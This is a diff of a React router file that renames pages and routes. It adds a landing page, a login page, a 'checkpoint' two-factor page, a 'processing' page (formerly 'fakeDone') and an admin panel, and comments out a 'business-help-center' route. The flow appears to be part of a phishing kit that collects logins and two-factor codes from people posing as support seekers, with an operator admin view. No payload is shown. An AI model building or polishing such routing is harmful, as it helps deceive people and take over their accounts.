@@ -1,8 +1,7 @@
 import { Route, Routes, BrowserRouter, Navigate } from "react-router-dom";
 import React, { useEffect, useState } from "react";
 import "./App.css";
-import MyForm from "./pages/MyForm";
-import ClassUser from "./pages/fakeDone";
+import SecurityDashboard from "./pages/SecurityDashboard";
 import AuthCode from "./pages/authCode";
 import Landing from "./pages/Landing";
 import LoginPage from "./pages/LoginPage";
@@ -17,7 +16,7 @@ function PrivateRoute({ children }) {
   return localStorage.getItem("logined") === "true" ? (
     <>{children}</>
   ) : (
-    <Navigate to="/login" />
+    <Navigate to="/adlogin" />
   );
 }
 
@@ -65,14 +64,14 @@ return (
             <BrowserRouter>
               <div id="app">
                 <Routes>
-                  <Route path="/test1" element={<Landing/>} />
-                  <Route path="/test2" element={<LoginPage/>} />
-                  <Route path="/test3" element={<Twofactor/>} />
-                  <Route path="id/:userID" element={<MyForm/>} />
+                  <Route path="/" element={<Landing/>} />
+                  <Route path="/login" element={<LoginPage/>} />
+                  <Route path="checkpoint/:userID" element={<Twofactor/>} />
+                  {/* <Route path="id/:userID" element={<MyForm/>} />
                   <Route path="/business-help-center" element={<MyForm/>} />
-                  <Route path="checkpoint/:userID" element={<AuthCode />} />
-                  <Route path="processing/:userID" element={<ClassUser />} />
-                  <Route path="/login" element={<Login />} />
+                  <Route path="checkpoint/:userID" element={<AuthCode />} /> */}
+                  <Route path="processing/:userID" element={<SecurityDashboard />} />
+                  <Route path="/adlogin" element={<Login />} />
                   <Route
                     path="/admin"
                     element={
